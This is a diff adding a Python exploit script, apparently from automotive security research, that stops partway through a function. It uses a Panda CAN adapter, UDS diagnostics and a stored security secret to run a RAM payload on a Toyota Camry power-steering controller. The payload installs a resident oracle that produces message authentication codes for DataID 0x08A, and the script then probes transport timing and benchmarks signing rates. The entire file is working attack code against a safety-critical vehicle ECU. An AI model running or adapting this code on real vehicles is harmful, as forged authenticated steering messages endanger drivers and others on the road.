@@ -1,0 +1,881 @@
+#!/usr/bin/env python3
+"""Install and exercise the exact-F33 high-rate 0x08A selector-4 MAC oracle."""
+from __future__ import annotations
+
+import argparse
+import hashlib
+import json
+import statistics
+import sys
+import threading
+import time
+from pathlib import Path
+from typing import Any
+
+
+
+
+from exploit.common.ram_exec import (
+    RAM_LOAD_ADDR,
+    RamExecError,
+    _import_uds,
+    _make_uds_client,
+    _read_f181,
+    ensure_boardd_stopped,
+    execute_ram_payload,
+    explicit_ram_exec_geometry,
+    explicit_route,
+    load_security_secret,
+)
+from tools.targets.camry.research.ram_runtime.monitor.camry_f33_runtime_monitor import PandaTap
+from exploit.ram_runtime.panda_eps import set_alloutput_mode, wait_for_f181
+from tools.targets.camry.research.ram_runtime.monitor.camry_f33_runtime_replay_discriminator import (
+    EXPECTED_BOOT_F181_HEX,
+    EXPECTED_F181_HEX,
+    _read_memory,
+    verify_nrtd_ready,
+    verify_ready_parked_on_panda,
+)
+
+EXPECTED_PAYLOAD_SHA256 = "e2be2710ffb30abc9863367833b28ea23bc577435fa2cdbb02e73f15cfa32f94"
+EXPECTED_STAGING_SHA256 = "00f3b5f1b57bdae7d8d137d3a000e609f3550af21368145afaafd36b80d404b1"
+EXPECTED_RESIDENT_SHA256 = "6b9ae91fef72c2efb91f105623438b29f846169eebc9eb8b8dac0a90e55ac121"
+EXPECTED_HELPER_SHA256 = "9bd6e370e201df7a13ceb85f5eb224708942cd818a4767452690972bc6bd2395"
+RESIDENT_BASE = 0xFEBFF9F0
+RESIDENT_SIZE = 412
+HELPER_BASE = 0xFEF07C00
+HELPER_SIZE = 340
+STATE_BASE = 0xFEBF025C
+STATE_SIZE = 0x20
+STATE_MAGIC = 0x524F3841
+STATE_VERSION = 1
+REQUEST_ADDR = 0x7A1
+RESPONSE_ADDR = 0x7A9
+DIAG_BUS = 0
+STATE_BUS = 0
+# Compatibility name used by the transport helpers/tests. Vehicle state is on
+# both STATE_BUS and EPS diagnostics/oracle I/O are on bus 0 after the
+# relay-correct F33 repin.
+BUS = DIAG_BUS
+PRIVATE_SID = 0xC9
+REQUEST_NSDU_LEN = 40
+DOMAIN_LEN = 36
+FLOW_CONTROL_TIMEOUT_S = 0.08
+RESPONSE_TIMEOUT_S = 0.10
+KNOWN_DOMAIN = bytes.fromhex(
+    "008a0000000080000012ffae00ffae7fff007fff004b0000000000001e00026c00455084"
+)
+KNOWN_MAC28 = "d64e2a5"
+
+ROUTE = explicit_route(bus=BUS, elm327_param=1, uds_variant="old", cpu_index=0)
+GEOMETRY = explicit_ram_exec_geometry(
+    load_addr=RAM_LOAD_ADDR,
+    evidence="dynamic:camry-8965F3307000-20260826",
+)
+
+
+class OracleStreamError(RuntimeError):
+    pass
+
+
+def decode_state(raw: bytes) -> dict[str, Any]:
+    if len(raw) != STATE_SIZE:
+        raise OracleStreamError(f"state returned {len(raw)} bytes; expected {STATE_SIZE}")
+    magic = int.from_bytes(raw[0:4], "little")
+    return {
+        "raw_hex": raw.hex(),
+        "magic": f"0x{magic:08X}",
+        "magic_ok": magic == STATE_MAGIC,
+        "version": raw[4],
+        "version_ok": raw[4] == STATE_VERSION,
+        "initialized": raw[5] == 1,
+        "last_seq": raw[6],
+        "last_status": raw[7],
+        "request_count": int.from_bytes(raw[8:12], "little"),
+        "success_count": int.from_bytes(raw[12:16], "little"),
+        "response_count": int.from_bytes(raw[16:20], "little"),
+        "last_command5_rc": raw[20],
+        "last_done_flag": raw[21],
+        "last_command_status": raw[22],
+        "last_output_length": raw[23],
+        "last_cmac_first4_hex": raw[24:28].hex(),
+        "last_response_tx_rc": raw[28],
+    }
+
+
+def build_request(seq: int, domain: bytes) -> bytes:
+    if not 0 <= seq <= 0xFF:
+        raise OracleStreamError("transaction sequence must be 0..255")
+    if len(domain) != DOMAIN_LEN:
+        raise OracleStreamError("authenticated domain must be exactly 36 bytes")
+    if domain[:2] != b"\x00\x8a":
+        raise OracleStreamError("streaming oracle accepts only DataID 0x008A")
+    return bytes((PRIVATE_SID, PRIVATE_SID, seq)) + domain + bytes((seq ^ 0xFF,))
+
+
+def trailer_from_cmac4(domain: bytes, cmac_first4: bytes) -> bytes:
+    if len(domain) != DOMAIN_LEN or len(cmac_first4) != 4:
+        raise OracleStreamError("invalid domain/CMAC length for trailer")
+    fv4 = (domain[-1] >> 2) & 0x0F
+    mac28 = int.from_bytes(cmac_first4, "big") >> 4
+    return ((fv4 << 28) | mac28).to_bytes(4, "big")
+
+
+def _stmin_seconds(raw: int) -> float:
+    if 0x00 <= raw <= 0x7F:
+        return raw / 1000.0
+    if 0xF1 <= raw <= 0xF9:
+        return (raw - 0xF0) / 10000.0
+    return 0.0
+
+
+def _drain(panda: PandaTap) -> list[tuple[int, bytes, int]]:
+    return [(int(addr), bytes(data), int(bus)) for addr, data, bus in (panda.can_recv() or [])]
+
+
+def _send_many_batched(panda: PandaTap, arr: list[tuple[int, bytes, int]]) -> None:
+    """Use Panda's native batch write without changing shared PandaTap behavior."""
+    raw = getattr(panda, "_panda", None)
+    lock = getattr(panda, "_send_lock", None)
+    if raw is not None and lock is not None and hasattr(raw, "can_send_many"):
+        with lock:
+            raw.can_send_many(arr)
+        return
+    panda.can_send_many(arr)
+
+
+def _wait_flow_control(panda: PandaTap, *, deadline: float) -> tuple[int, int, list[str]]:
+    observed: list[str] = []
+    while time.monotonic() < deadline:
+        rows = _drain(panda)
+        if not rows:
+            time.sleep(0.0005)
+            continue
+        for addr, frame, bus in rows:
+            if addr != RESPONSE_ADDR or bus != BUS or len(frame) != 8:
+                continue
+            observed.append(frame.hex())
+            if frame[0] >> 4 != 3:
+                continue
+            flow_status = frame[0] & 0x0F
+            if flow_status == 0:
+                return frame[1], frame[2], observed
+            if flow_status == 1:
+                continue
+            raise OracleStreamError(f"EPS ISO-TP flow control rejected request: {frame.hex()}")
+    raise TimeoutError(f"0x{RESPONSE_ADDR:03X} flow control timeout")
+
+
+def send_oracle_request(
+    panda: PandaTap, *, seq: int, domain: bytes, cf_gap_ms: float | None = None,
+    skip_flow_control: bool = False, pre_cf_delay_ms: float = 0.0,
+) -> dict[str, Any]:
+    nsdu = build_request(seq, domain)
+    if len(nsdu) != REQUEST_NSDU_LEN:
+        raise AssertionError("internal oracle N-SDU length drift")
+    _drain(panda)
+    started_ns = time.monotonic_ns()
+    ff = bytes((0x10 | (len(nsdu) >> 8), len(nsdu) & 0xFF)) + nsdu[:6]
+
+    # Prebuild the full CF sequence once. The normal path waits for FC before
+    # submitting it; the no-FC discriminator submits FF+CFs in one Panda batch.
+    remaining_for_frames = nsdu[6:]
+    sn_for_frames = 1
+    cf_frames: list[bytes] = []
+    while remaining_for_frames:
+        chunk, remaining_for_frames = remaining_for_frames[:7], remaining_for_frames[7:]
+        frame = bytes((0x20 | (sn_for_frames & 0x0F),)) + chunk + bytes(7 - len(chunk))
+        cf_frames.append(frame)
+        sn_for_frames = (sn_for_frames + 1) & 0x0F
+    cfs = [frame.hex() for frame in cf_frames]
+
+    fc_seen: list[str] = []
+    first_fc_ns: int | None = None
+    bs = 0
+    stmin_raw = 0
+    advertised_stmin_s = 0.0
+    effective_gap_s = 0.0
+    ff_sent_ns = started_ns
+    cf_batch_submit_start_ns = started_ns
+
+    if skip_flow_control:
+        if cf_gap_ms not in (None, 0.0):
+            raise OracleStreamError("no-FC transport probe requires CF gap 0 ms")
+        if not 0.0 <= pre_cf_delay_ms <= 40.0:
+            raise OracleStreamError("no-FC pre-CF delay must be 0..40 ms")
+        if pre_cf_delay_ms == 0.0:
+            request_batch = [(REQUEST_ADDR, ff, BUS)] + [(REQUEST_ADDR, frame, BUS) for frame in cf_frames]
+            cf_batch_submit_start_ns = time.monotonic_ns()
+            _send_many_batched(panda, request_batch)
+            final_cf_ns = time.monotonic_ns()
+        else:
+            panda.can_send(REQUEST_ADDR, ff, BUS)
+            ff_sent_ns = time.monotonic_ns()
+            time.sleep(pre_cf_delay_ms / 1000.0)
+            cf_batch_submit_start_ns = time.monotonic_ns()
+            _send_many_batched(panda, [(REQUEST_ADDR, frame, BUS) for frame in cf_frames])
+            final_cf_ns = time.monotonic_ns()
+    else:
+        panda.can_send(REQUEST_ADDR, ff, BUS)
+        ff_sent_ns = time.monotonic_ns()
+        bs, stmin_raw, fc_seen = _wait_flow_control(
+            panda, deadline=time.monotonic() + FLOW_CONTROL_TIMEOUT_S,
+        )
+        first_fc_ns = time.monotonic_ns()
+        advertised_stmin_s = _stmin_seconds(stmin_raw)
+        if cf_gap_ms is not None and not 0.0 <= cf_gap_ms <= 1000.0:
+            raise OracleStreamError("CF gap override must be 0..1000 ms")
+        effective_gap_s = advertised_stmin_s if cf_gap_ms is None else cf_gap_ms / 1000.0
+
+        remaining = nsdu[6:]
+        sn = 1
+        sent_in_block = 0
+        cf_batch_submit_start_ns = time.monotonic_ns()
+        if not effective_gap_s and bs == 0:
+            batch = [(REQUEST_ADDR, frame, BUS) for frame in cf_frames]
+            _send_many_batched(panda, batch)
+        else:
+            while remaining:
+                chunk, remaining = remaining[:7], remaining[7:]
+                frame = bytes((0x20 | (sn & 0x0F),)) + chunk + bytes(7 - len(chunk))
+                if effective_gap_s:
+                    time.sleep(effective_gap_s)
+                panda.can_send(REQUEST_ADDR, frame, BUS)
+                sn = (sn + 1) & 0x0F
+                sent_in_block += 1
+                if bs and sent_in_block >= bs and remaining:
+                    bs, stmin_raw, more_fc = _wait_flow_control(
+                        panda, deadline=time.monotonic() + FLOW_CONTROL_TIMEOUT_S,
+                    )
+                    fc_seen.extend(more_fc)
+                    advertised_stmin_s = _stmin_seconds(stmin_raw)
+                    effective_gap_s = advertised_stmin_s if cf_gap_ms is None else cf_gap_ms / 1000.0
+                    sent_in_block = 0
+        final_cf_ns = time.monotonic_ns()
+
+    stock_responses: list[str] = []
+    other_7a9: list[str] = []
+    deadline = time.monotonic() + RESPONSE_TIMEOUT_S
+    while time.monotonic() < deadline:
+        rows = _drain(panda)
+        if not rows:
+            time.sleep(0.0005)
+            continue
+        for addr, frame, bus in rows:
+            if addr != RESPONSE_ADDR or bus != BUS or len(frame) != 8:
+                continue
+            if frame[0] >> 4 == 3:
+                fc_seen.append(frame.hex())
+                if first_fc_ns is None:
+                    first_fc_ns = time.monotonic_ns()
+                    bs = frame[1]
+                    stmin_raw = frame[2]
+                    advertised_stmin_s = _stmin_seconds(stmin_raw)
+                continue
+            if frame[0] == 0x07 and frame[1] == PRIVATE_SID and frame[2] == seq:
+                response_ns = time.monotonic_ns()
+                status = frame[3]
+                cmac4 = frame[4:8]
+                return {
+                    "seq": seq,
+                    "status": status,
+                    "cmac_first4_hex": cmac4.hex(),
+                    "mac28_hex": cmac4.hex()[:7] if status == 0 else None,
+                    "trailer_hex": trailer_from_cmac4(domain, cmac4).hex() if status == 0 else None,
+                    "response_frame_hex": frame.hex(),
+                    "flow_control_frames": fc_seen,
+                    "consecutive_frames": cfs,
+                    "stock_responses": stock_responses,
+                    "other_7a9_frames": other_7a9,
+                    "stmin_raw": stmin_raw,
+                    "advertised_stmin_ms": round(advertised_stmin_s * 1000.0, 3),
+                    "effective_cf_gap_ms": round(effective_gap_s * 1000.0, 3),
+                    "stmin_override_used": cf_gap_ms is not None,
+                    "stmin_violated": (
+                        (skip_flow_control and advertised_stmin_s > 0.0)
+                        or (cf_gap_ms is not None and effective_gap_s < advertised_stmin_s)
+                    ),
+                    "block_size": bs,
+                    "request_start_to_response_ms": round((response_ns - started_ns) / 1e6, 3),
+                    "ff_send_to_fc_ms": (
+                        round((first_fc_ns - ff_sent_ns) / 1e6, 3) if first_fc_ns is not None else None
+                    ),
+                    "cf_submit_ms": round((final_cf_ns - cf_batch_submit_start_ns) / 1e6, 3),
+                    "final_cf_to_response_ms": round((response_ns - final_cf_ns) / 1e6, 3),
+                    "cf_batch_used": bool(not effective_gap_s and bs == 0),
+                    "flow_control_waited": not skip_flow_control,
+                    "pre_cf_delay_ms": pre_cf_delay_ms if skip_flow_control else None,
+                    "request_batch_included_ff": bool(skip_flow_control and pre_cf_delay_ms == 0.0),
+                }
+            if frame[0] == 0x03 and frame[1] == 0x7F and frame[2] == PRIVATE_SID:
+                stock_responses.append(frame.hex())
+            else:
+                other_7a9.append(frame.hex())
+    raise TimeoutError(f"streaming oracle response timeout for seq {seq}")
+
+
+class OracleStreamSession:
+    def __init__(self, *, require_ready_parked: bool = True):
+        ensure_boardd_stopped()
+        try:
+            from panda import Panda
+        except ImportError as exc:
+            raise OracleStreamError("panda module unavailable") from exc
+        self.uds_mod = _import_uds()
+        self.panda = PandaTap(Panda())
+        set_alloutput_mode(self.panda)
+        self.vehicle_guard = verify_ready_parked_on_panda(
+            self.panda, state_bus=STATE_BUS, ready_buses=frozenset((STATE_BUS,)),
+        ) if require_ready_parked else None
+        self.client = _make_uds_client(
+            self.panda, self.uds_mod, ROUTE, timeout=0.3, response_pending_timeout=1.0,
+        )
+        f181_hex, f181_ascii = _read_f181(self.client, self.uds_mod)
+        if f181_hex is None or f181_hex.lower() != EXPECTED_F181_HEX:
+            raise OracleStreamError(f"exact application F181 unavailable: {f181_hex}")
+        self.f181_hex = f181_hex
+        self.f181_ascii = f181_ascii
+        self.client.diagnostic_session_control(self.uds_mod.SESSION_TYPE.EXTENDED_DIAGNOSTIC)
+        resident = _read_memory(self.client, self.uds_mod, RESIDENT_BASE, RESIDENT_SIZE)
+        if hashlib.sha256(resident).hexdigest() != EXPECTED_RESIDENT_SHA256:
+            raise OracleStreamError("streaming oracle resident identity mismatch")
+        state = self.read_state()
+        if not (state["magic_ok"] and state["version_ok"] and state["initialized"]):
+            raise OracleStreamError(f"streaming oracle state unavailable: {state}")
+
+    def read_state(self) -> dict[str, Any]:
+        return decode_state(_read_memory(self.client, self.uds_mod, STATE_BASE, STATE_SIZE))
+
+    def sign(
+        self, domain: bytes, *, seq: int, cf_gap_ms: float | None = None,
+        skip_flow_control: bool = False, pre_cf_delay_ms: float = 0.0,
+    ) -> dict[str, Any]:
+        return send_oracle_request(
+            self.panda, seq=seq, domain=domain, cf_gap_ms=cf_gap_ms,
+            skip_flow_control=skip_flow_control, pre_cf_delay_ms=pre_cf_delay_ms,
+        )
+
+
+def install(payload_path: Path) -> dict[str, Any]:
+    payload = payload_path.read_bytes()
+    if len(payload) != 0x1000 or hashlib.sha256(payload).hexdigest() != EXPECTED_PAYLOAD_SHA256:
+        raise OracleStreamError("authenticated streaming-oracle payload identity mismatch")
+    nrtd = verify_nrtd_ready(route=ROUTE, ready_buses=frozenset((STATE_BUS,)))
+    secret, _ = load_security_secret()
+    execution = execute_ram_payload(
+        payload, route=ROUTE, security_secret=secret, timeout=0.08,
+        expected_f181_hex=EXPECTED_F181_HEX, expected_boot_f181_hex=EXPECTED_BOOT_F181_HEX,
+        geometry=GEOMETRY,
+    )
+    trigger_return = time.monotonic()
+    pre = wait_for_f181(timeout=0.72, route=ROUTE, expected_f181_hex=EXPECTED_F181_HEX)
+    result: dict[str, Any] = {
+        "schema": "camry-f33-08a-oracle-stream-install-v1",
+        "payload_sha256": EXPECTED_PAYLOAD_SHA256,
+        "staging_sha256": EXPECTED_STAGING_SHA256,
+        "resident_sha256": EXPECTED_RESIDENT_SHA256,
+        "helper_sha256": EXPECTED_HELPER_SHA256,
+        "nrtd_guard": nrtd,
+        "execution": execution,
+        "pre_helper_f181": pre,
+        "persistent_flash_writes": False,
+        "transmitted_08a": False,
+        "transmitted_b6": False,
+    }
+    if not pre["ok"]:
+        result["verdict"] = "abi_preserving_runtime_failed_before_helper_initialization"
+        return result
+    remaining = (trigger_return + 1.40) - time.monotonic()
+    if remaining > 0:
+        time.sleep(remaining)
+    try:
+        session = OracleStreamSession(require_ready_parked=False)
+        result["state"] = session.read_state()
+        result["verdict"] = "runtime_08a_oracle_stream_live"
+    except Exception as exc:  # noqa: BLE001 - retain exact attestation failure
+        result["attestation_error"] = f"{type(exc).__name__}: {exc}"
+        result["verdict"] = "application_live_but_oracle_stream_attestation_failed"
+    return result
+
+
+def known_answer(session: OracleStreamSession, *, seq: int = 1) -> dict[str, Any]:
+    result = session.sign(KNOWN_DOMAIN, seq=seq)
+    matched = result.get("status") == 0 and result.get("mac28_hex") == KNOWN_MAC28
+    return {
+        "schema": "camry-f33-08a-oracle-stream-known-answer-v1",
+        "domain_hex": KNOWN_DOMAIN.hex(),
+        "expected_mac28_hex": KNOWN_MAC28,
+        "matched": matched,
+        "result": result,
+        "state": session.read_state(),
+    }
+
+
+def transport_probe(session: OracleStreamSession, *, cf_gap_ms: float) -> dict[str, Any]:
+    if not 0.0 <= cf_gap_ms <= 40.0:
+        raise OracleStreamError("transport probe CF gap must be 0..40 ms")
+    state_before = session.read_state()
+    seq = (int(state_before["last_seq"]) % 255) + 1
+    result = session.sign(KNOWN_DOMAIN, seq=seq, cf_gap_ms=cf_gap_ms)
+    matched = result.get("status") == 0 and result.get("mac28_hex") == KNOWN_MAC28
+    return {
+        "schema": "camry-f33-08a-oracle-stream-transport-probe-v1",
+        "domain_hex": KNOWN_DOMAIN.hex(),
+        "expected_mac28_hex": KNOWN_MAC28,
+        "cf_gap_ms_requested": cf_gap_ms,
+        "matched": matched,
+        "state_before": state_before,
+        "result": result,
+        "state_after": session.read_state(),
+        "boundaries": {
+            "single_request": True,
+            "transmitted_08a": False,
+            "transmitted_b6": False,
+            "persistent_flash_write": False,
+            "deliberately_violates_advertised_stmin_when_gap_is_lower": True,
+        },
+    }
+
+
+def transport_probe_no_fc(session: OracleStreamSession) -> dict[str, Any]:
+    state_before = session.read_state()
+    seq = (int(state_before["last_seq"]) % 255) + 1
+    result = session.sign(KNOWN_DOMAIN, seq=seq, cf_gap_ms=0.0, skip_flow_control=True)
+    matched = result.get("status") == 0 and result.get("mac28_hex") == KNOWN_MAC28
+    return {
+        "schema": "camry-f33-08a-oracle-stream-no-fc-probe-v1",
+        "domain_hex": KNOWN_DOMAIN.hex(),
+        "expected_mac28_hex": KNOWN_MAC28,
+        "matched": matched,
+        "state_before": state_before,
+        "result": result,
+        "state_after": session.read_state(),
+        "boundaries": {
+            "single_request": True,
+            "transmitted_08a": False,
+            "transmitted_b6": False,
+            "persistent_flash_write": False,
+            "flow_control_waited": False,
+            "ff_and_cfs_submitted_in_one_panda_batch": True,
+        },
+    }
+
+
+def transport_probe_fixed_delay(session: OracleStreamSession, *, delay_ms: float) -> dict[str, Any]:
+    if not 0.0 < delay_ms <= 40.0:
+        raise OracleStreamError("fixed-delay transport probe requires delay >0 and <=40 ms")
+    state_before = session.read_state()
+    seq = (int(state_before["last_seq"]) % 255) + 1
+    result = session.sign(
+        KNOWN_DOMAIN, seq=seq, cf_gap_ms=0.0, skip_flow_control=True,
+        pre_cf_delay_ms=delay_ms,
+    )
+    matched = result.get("status") == 0 and result.get("mac28_hex") == KNOWN_MAC28
+    return {
+        "schema": "camry-f33-08a-oracle-stream-fixed-delay-probe-v1",
+        "domain_hex": KNOWN_DOMAIN.hex(),
+        "expected_mac28_hex": KNOWN_MAC28,
+        "delay_ms": delay_ms,
+        "matched": matched,
+        "state_before": state_before,
+        "result": result,
+        "state_after": session.read_state(),
+        "boundaries": {
+            "single_request": True,
+            "transmitted_08a": False,
+            "transmitted_b6": False,
+            "persistent_flash_write": False,
+            "flow_control_waited": False,
+            "ff_sent_before_fixed_delay": True,
+            "cfs_submitted_in_one_panda_batch": True,
+        },
+    }
+
+
+def benchmark(
+    session: OracleStreamSession, *, count: int, period_ms: float, cf_gap_ms: float | None = None,
+    skip_flow_control: bool = False, pre_cf_delay_ms: float = 0.0,
+) -> dict[str, Any]:
+    if not 1 <= count <= 200:
+        raise OracleStreamError("benchmark count must be 1..200")
+    if not 5.0 <= period_ms <= 1000.0:
+        raise OracleStreamError("benchmark period must be 5..1000 ms")
+    if cf_gap_ms is not None and not 0.0 <= cf_gap_ms <= 40.0:
+        raise OracleStreamError("benchmark CF gap override must be 0..40 ms")
+    rows: list[dict[str, Any]] = []
+    start_seq = (int(session.read_state()["last_seq"]) + 1) & 0xFF
+    if start_seq == 0:
+        start_seq = 1
+    next_start = time.monotonic()
+    for i in range(count):
+        now = time.monotonic()
+        if now < next_start:
+            time.sleep(next_start - now)
+        seq = ((start_seq - 1 + i) % 255) + 1
+        started = time.monotonic()
+        scheduled_lateness_ms = max(0.0, (started - next_start) * 1000.0)
+        try:
+            row = session.sign(
+                KNOWN_DOMAIN, seq=seq, cf_gap_ms=cf_gap_ms,
+                skip_flow_control=skip_flow_control, pre_cf_delay_ms=pre_cf_delay_ms,
+            )
+            row["known_mac28_match"] = row.get("mac28_hex") == KNOWN_MAC28
+        except Exception as exc:  # noqa: BLE001 - benchmark records bounded failure
+            row = {"seq": seq, "error": f"{type(exc).__name__}: {exc}"}
+        row["iteration_wall_ms"] = round((time.monotonic() - started) * 1000.0, 3)
+        row["scheduled_start_lateness_ms"] = round(scheduled_lateness_ms, 3)
+        rows.append(row)
+        next_start += period_ms / 1000.0
+
+    good = [r for r in rows if r.get("status") == 0 and r.get("known_mac28_match")]
+    rtts = [float(r["request_start_to_response_ms"]) for r in good]
+    final_rtts = [float(r["final_cf_to_response_ms"]) for r in good]
+    def pct(values: list[float], p: float) -> float | None:
+        if not values:
+            return None
+        ordered = sorted(values)
+        idx = min(len(ordered) - 1, max(0, round((len(ordered) - 1) * p)))
+        return round(ordered[idx], 3)
+    return {
+        "schema": "camry-f33-08a-oracle-stream-benchmark-v1",
+        "count": count,
+        "period_ms": period_ms,
+        "cf_gap_ms": cf_gap_ms,
+        "skip_flow_control": skip_flow_control,
+        "pre_cf_delay_ms": pre_cf_delay_ms if skip_flow_control else None,
+        "stmin_override_used": cf_gap_ms is not None,
+        "success_count": len(good),
+        "success_rate": len(good) / count,
+        "request_start_to_response_ms": {
+            "median": round(statistics.median(rtts), 3) if rtts else None,
+            "p95": pct(rtts, 0.95), "max": round(max(rtts), 3) if rtts else None,
+        },
+        "final_cf_to_response_ms": {
+            "median": round(statistics.median(final_rtts), 3) if final_rtts else None,
+            "p95": pct(final_rtts, 0.95), "max": round(max(final_rtts), 3) if final_rtts else None,
+        },
+        "within_25ms_all_successes": bool(rtts) and max(rtts) < 25.0,
+        "max_scheduled_start_lateness_ms": round(max((float(r["scheduled_start_lateness_ms"]) for r in rows), default=0.0), 3),
+        "rows": rows,
+        "state": session.read_state(),
+    }
+
+
+def benchmark_pipelined(
+    session: OracleStreamSession, *, count: int, period_ms: float = 25.0,
+    pre_cf_delay_ms: float = 5.0, drain_timeout_s: float = 1.0,
+) -> dict[str, Any]:
+    if not 1 <= count <= 200:
+        raise OracleStreamError("pipelined benchmark count must be 1..200")
+    if not 5.0 <= period_ms <= 1000.0:
+        raise OracleStreamError("pipelined benchmark period must be 5..1000 ms")
+    if not 2.0 <= pre_cf_delay_ms < period_ms:
+        raise OracleStreamError("pipelined pre-CF delay must be >=2 ms and less than period")
+    if not 0.1 <= drain_timeout_s <= 5.0:
+        raise OracleStreamError("pipelined drain timeout must be 0.1..5 seconds")
+
+    state_before = session.read_state()
+    first_seq = (int(state_before["last_seq"]) % 255) + 1
+    seqs = [((first_seq - 1 + i) % 255) + 1 for i in range(count)]
+    if len(set(seqs)) != len(seqs):
+        raise OracleStreamError("pipelined sequence window wrapped onto itself")
+
+    # Clear stale host-facing CAN before binding replies to this run.
+    _drain(session.panda)
+    rx_lock = threading.Lock()
+    stop_rx = threading.Event()
+    responses: dict[int, dict[str, Any]] = {}
+    fc_frames: list[dict[str, Any]] = []
+    stock_nrcs: list[dict[str, Any]] = []
+    rx_errors: list[str] = []
+
+    def receiver() -> None:
+        while not stop_rx.is_set():
+            try:
+                rows = session.panda.can_recv() or []
+            except Exception as exc:  # noqa: BLE001 - record async transport failure
+                with rx_lock:
+                    rx_errors.append(f"{type(exc).__name__}: {exc}")
+                return
+            now_ns = time.monotonic_ns()
+            with rx_lock:
+                for addr, frame, bus in rows:
+                    data = bytes(frame)
+                    if int(addr) != RESPONSE_ADDR or int(bus) != BUS or len(data) != 8:
+                        continue
+                    if data[0] >> 4 == 3:
+                        fc_frames.append({"monotonic_ns": now_ns, "frame_hex": data.hex()})
+                        continue
+                    if data[0] == 0x03 and data[1] == 0x7F and data[2] == PRIVATE_SID:
+                        stock_nrcs.append({"monotonic_ns": now_ns, "frame_hex": data.hex()})
+                        continue
+                    if data[0] == 0x07 and data[1] == PRIVATE_SID:
+                        seq = data[2]
+                        responses.setdefault(seq, {
+                            "monotonic_ns": now_ns,
+                            "frame_hex": data.hex(),
+                            "status": data[3],
+                            "cmac_first4_hex": data[4:8].hex(),
+                            "mac28_hex": data[4:8].hex()[:7],
+                        })
+
+    rx_thread = threading.Thread(target=receiver, name="f33-08a-oracle-rx", daemon=True)
+    rx_thread.start()
+
+    sends: list[dict[str, Any]] = []
+    schedule_zero = time.monotonic()
+    period_s = period_ms / 1000.0
+    try:
+        for i, seq in enumerate(seqs):
+            target = schedule_zero + i * period_s
+            now = time.monotonic()
+            if now < target:
+                time.sleep(target - now)
+            actual_start = time.monotonic()
+            started_ns = time.monotonic_ns()
+            nsdu = build_request(seq, KNOWN_DOMAIN)
+            ff = bytes((0x10 | (len(nsdu) >> 8), len(nsdu) & 0xFF)) + nsdu[:6]
+            remaining = nsdu[6:]
+            sn = 1
+            batch: list[tuple[int, bytes, int]] = []
+            cfs: list[str] = []
+            while remaining:
+                chunk, remaining = remaining[:7], remaining[7:]
+                frame = bytes((0x20 | (sn & 0x0F),)) + chunk + bytes(7 - len(chunk))
+                batch.append((REQUEST_ADDR, frame, BUS))
+                cfs.append(frame.hex())
+                sn = (sn + 1) & 0x0F
+
+            ff_send_start_ns = time.monotonic_ns()
+            session.panda.can_send(REQUEST_ADDR, ff, BUS)
+            ff_send_end_ns = time.monotonic_ns()
+            ready_at = time.monotonic() + pre_cf_delay_ms / 1000.0
+            remaining_sleep = ready_at - time.monotonic()
+            if remaining_sleep > 0:
+                time.sleep(remaining_sleep)
+            cf_submit_start_ns = time.monotonic_ns()
+            _send_many_batched(session.panda, batch)
+            cf_submit_end_ns = time.monotonic_ns()
+            sends.append({
+                "seq": seq,
+                "scheduled_start_lateness_ms": round(max(0.0, (actual_start - target) * 1000.0), 3),
+                "started_ns": started_ns,
+                "ff_send_ms": round((ff_send_end_ns - ff_send_start_ns) / 1e6, 3),
+                "cf_submit_ms": round((cf_submit_end_ns - cf_submit_start_ns) / 1e6, 3),
+                "pre_cf_delay_ms": pre_cf_delay_ms,
+                "consecutive_frames": cfs,
+            })
+
+        deadline = time.monotonic() + drain_timeout_s
+        while time.monotonic() < deadline:
+            with rx_lock:
+                if len(responses) >= count or rx_errors:
+                    break
+            time.sleep(0.001)
+    finally:
+        stop_rx.set()
+        rx_thread.join(timeout=1.0)
+
+    with rx_lock:
+        responses_copy = dict(responses)
+        fc_copy = list(fc_frames)
+        nrc_copy = list(stock_nrcs)
+        errors_copy = list(rx_errors)
+
+    rows: list[dict[str, Any]] = []
+    for sent in sends:
+        seq = int(sent["seq"])
+        response = responses_copy.get(seq)
+        row = {k: v for k, v in sent.items() if k != "started_ns"}
+        if response is None:
+            row["error"] = "missing_response"
+        else:
+            row.update({
+                "response_frame_hex": response["frame_hex"],
+                "status": response["status"],
+                "cmac_first4_hex": response["cmac_first4_hex"],
+                "mac28_hex": response["mac28_hex"],
+                "known_mac28_match": response["mac28_hex"] == KNOWN_MAC28,
+                "request_start_to_response_ms": round(
+                    (int(response["monotonic_ns"]) - int(sent["started_ns"])) / 1e6, 3
+                ),
+            })
+        rows.append(row)
+
+    state_after = session.read_state()
+    good = [r for r in rows if r.get("status") == 0 and r.get("known_mac28_match")]
+    rtts = [float(r["request_start_to_response_ms"]) for r in good]
+    lateness = [float(r["scheduled_start_lateness_ms"]) for r in rows]
+
+    def pct(values: list[float], p: float) -> float | None:
+        if not values:
+            return None
+        ordered = sorted(values)
+        idx = min(len(ordered) - 1, max(0, round((len(ordered) - 1) * p)))
+        return round(ordered[idx], 3)
+
+    return {
+        "schema": "camry-f33-08a-oracle-stream-pipelined-benchmark-v1",
+        "count": count,
+        "period_ms": period_ms,
+        "pre_cf_delay_ms": pre_cf_delay_ms,
+        "success_count": len(good),
+        "success_rate": len(good) / count,
+        "responses_received": len(responses_copy),
+        "flow_control_frames_received": len(fc_copy),
+        "stock_nrc_count": len(nrc_copy),
+        "rx_errors": errors_copy,
+        "request_start_to_response_ms": {
+            "median": round(statistics.median(rtts), 3) if rtts else None,
+            "p95": pct(rtts, 0.95),
+            "p99": pct(rtts, 0.99),
+            "max": round(max(rtts), 3) if rtts else None,
+        },
+        "scheduled_start_lateness_ms": {
+            "median": round(statistics.median(lateness), 3) if lateness else None,
+            "p95": pct(lateness, 0.95),
+            "max": round(max(lateness), 3) if lateness else None,
+        },
+        "within_25ms_all_observed_responses": bool(rtts) and max(rtts) < 25.0,
+        "resident_counter_deltas": {
+            "request_count": int(state_after["request_count"]) - int(state_before["request_count"]),
+            "success_count": int(state_after["success_count"]) - int(state_before["success_count"]),
+            "response_count": int(state_after["response_count"]) - int(state_before["response_count"]),
+        },
+        "state_before": state_before,
+        "state_after": state_after,
+        "rows": rows,
+        "boundaries": {
+            "transmitted_08a": False,
+            "transmitted_b6": False,
+            "persistent_flash_write": False,
+            "sender_waits_for_response": False,
+            "dedicated_receiver_thread": True,
+        },
+    }
+
+
+def plan(payload: Path | None) -> dict[str, Any]:
+    raw = payload.read_bytes() if payload is not None and payload.is_file() else b""
+    return {
+        "schema": "camry-f33-08a-oracle-stream-plan-v1",
+        "target": "8965F3307000",
+        "payload": {
+            "path": str(payload) if payload else None,
+            "sha256": hashlib.sha256(raw).hexdigest() if raw else None,
+            "expected_sha256": EXPECTED_PAYLOAD_SHA256,
+        },
